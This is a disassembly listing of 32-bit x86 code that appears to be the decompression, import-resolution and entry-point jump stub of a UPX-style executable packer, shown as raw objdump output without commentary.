  40edd0:	11 c9                	adc    %ecx,%ecx
  40edd2:	75 20                	jne    0x40edf4
  40edd4:	41                   	inc    %ecx
  40edd5:	01 db                	add    %ebx,%ebx
  40edd7:	75 07                	jne    0x40ede0
  40edd9:	8b 1e                	mov    (%esi),%ebx
  40eddb:	83 ee fc             	sub    $0xfffffffc,%esi
  40edde:	11 db                	adc    %ebx,%ebx
  40ede0:	11 c9                	adc    %ecx,%ecx
  40ede2:	01 db                	add    %ebx,%ebx
  40ede4:	73 ef                	jae    0x40edd5
  40ede6:	75 09                	jne    0x40edf1
  40ede8:	8b 1e                	mov    (%esi),%ebx
  40edea:	83 ee fc             	sub    $0xfffffffc,%esi
  40eded:	11 db                	adc    %ebx,%ebx
  40edef:	73 e4                	jae    0x40edd5
  40edf1:	83 c1 02             	add    $0x2,%ecx
  40edf4:	81 fd 00 f3 ff ff    	cmp    $0xfffff300,%ebp
  40edfa:	83 d1 01             	adc    $0x1,%ecx
  40edfd:	8d 14 2f             	lea    (%edi,%ebp,1),%edx
  40ee00:	83 fd fc             	cmp    $0xfffffffc,%ebp
  40ee03:	76 0f                	jbe    0x40ee14
  40ee05:	8a 02                	mov    (%edx),%al
  40ee07:	42                   	inc    %edx
  40ee08:	88 07                	mov    %al,(%edi)
  40ee0a:	47                   	inc    %edi
  40ee0b:	49                   	dec    %ecx
  40ee0c:	75 f7                	jne    0x40ee05
  40ee0e:	e9 63 ff ff ff       	jmp    0x40ed76
  40ee13:	90                   	nop
  40ee14:	8b 02                	mov    (%edx),%eax
  40ee16:	83 c2 04             	add    $0x4,%edx
  40ee19:	89 07                	mov    %eax,(%edi)
  40ee1b:	83 c7 04             	add    $0x4,%edi
  40ee1e:	83 e9 04             	sub    $0x4,%ecx
  40ee21:	77 f1                	ja     0x40ee14
  40ee23:	01 cf                	add    %ecx,%edi
  40ee25:	e9 4c ff ff ff       	jmp    0x40ed76
  40ee2a:	5e                   	pop    %esi
  40ee2b:	89 f7                	mov    %esi,%edi
  40ee2d:	b9 de 00 00 00       	mov    $0xde,%ecx
  40ee32:	8a 07                	mov    (%edi),%al
  40ee34:	47                   	inc    %edi
  40ee35:	2c e8                	sub    $0xe8,%al
  40ee37:	3c 01                	cmp    $0x1,%al
  40ee39:	77 f7                	ja     0x40ee32
  40ee3b:	80 3f 01             	cmpb   $0x1,(%edi)
  40ee3e:	75 f2                	jne    0x40ee32
  40ee40:	8b 07                	mov    (%edi),%eax
  40ee42:	8a 5f 04             	mov    0x4(%edi),%bl
  40ee45:	66 c1 e8 08          	shr    $0x8,%ax
  40ee49:	c1 c0 10             	rol    $0x10,%eax
  40ee4c:	86 c4                	xchg   %al,%ah
  40ee4e:	29 f8                	sub    %edi,%eax
  40ee50:	80 eb e8             	sub    $0xe8,%bl
  40ee53:	01 f0                	add    %esi,%eax
  40ee55:	89 07                	mov    %eax,(%edi)
  40ee57:	83 c7 05             	add    $0x5,%edi
  40ee5a:	88 d8                	mov    %bl,%al
  40ee5c:	e2 d9                	loop   0x40ee37
  40ee5e:	8d be 00 c0 00 00    	lea    0xc000(%esi),%edi
  40ee64:	8b 07                	mov    (%edi),%eax
  40ee66:	09 c0                	or     %eax,%eax
  40ee68:	74 45                	je     0x40eeaf
  40ee6a:	8b 5f 04             	mov    0x4(%edi),%ebx
  40ee6d:	8d 84 30 b8 19 01 00 	lea    0x119b8(%eax,%esi,1),%eax
  40ee74:	01 f3                	add    %esi,%ebx
  40ee76:	50                   	push   %eax
  40ee77:	83 c7 08             	add    $0x8,%edi
  40ee7a:	ff 96 58 1a 01 00    	call   *0x11a58(%esi)
  40ee80:	95                   	xchg   %eax,%ebp
  40ee81:	8a 07                	mov    (%edi),%al
  40ee83:	47                   	inc    %edi
  40ee84:	08 c0                	or     %al,%al
  40ee86:	74 dc                	je     0x40ee64
  40ee88:	89 f9                	mov    %edi,%ecx
  40ee8a:	79 07                	jns    0x40ee93
  40ee8c:	0f b7 07             	movzwl (%edi),%eax
  40ee8f:	47                   	inc    %edi
  40ee90:	50                   	push   %eax
  40ee91:	47                   	inc    %edi
  40ee92:	b9 57 48 f2 ae       	mov    $0xaef24857,%ecx
  40ee97:	55                   	push   %ebp
  40ee98:	ff 96 5c 1a 01 00    	call   *0x11a5c(%esi)
  40ee9e:	09 c0                	or     %eax,%eax
  40eea0:	74 07                	je     0x40eea9
  40eea2:	89 03                	mov    %eax,(%ebx)
  40eea4:	83 c3 04             	add    $0x4,%ebx
  40eea7:	eb d8                	jmp    0x40ee81
  40eea9:	ff 96 6c 1a 01 00    	call   *0x11a6c(%esi)
  40eeaf:	8b ae 60 1a 01 00    	mov    0x11a60(%esi),%ebp
  40eeb5:	8d be 00 f0 ff ff    	lea    -0x1000(%esi),%edi
  40eebb:	bb 00 10 00 00       	mov    $0x1000,%ebx
  40eec0:	50                   	push   %eax
  40eec1:	54                   	push   %esp
  40eec2:	6a 04                	push   $0x4
  40eec4:	53                   	push   %ebx
  40eec5:	57                   	push   %edi
  40eec6:	ff d5                	call   *%ebp
  40eec8:	8d 87 f7 01 00 00    	lea    0x1f7(%edi),%eax
  40eece:	80 20 7f             	andb   $0x7f,(%eax)
  40eed1:	80 60 28 7f          	andb   $0x7f,0x28(%eax)
  40eed5:	58                   	pop    %eax
  40eed6:	50                   	push   %eax
  40eed7:	54                   	push   %esp
  40eed8:	50                   	push   %eax
  40eed9:	53                   	push   %ebx
  40eeda:	57                   	push   %edi
  40eedb:	ff d5                	call   *%ebp
  40eedd:	58                   	pop    %eax
  40eede:	61                   	popa
  40eedf:	8d 44 24 80          	lea    -0x80(%esp),%eax
  40eee3:	6a 00                	push   $0x0
  40eee5:	39 c4                	cmp    %eax,%esp
  40eee7:	75 fa                	jne    0x40eee3
  40eee9:	83 ec 80             	sub    $0xffffff80,%esp
  40eeec:	e9 c1 29 ff ff       	jmp    0x4018b2
	...
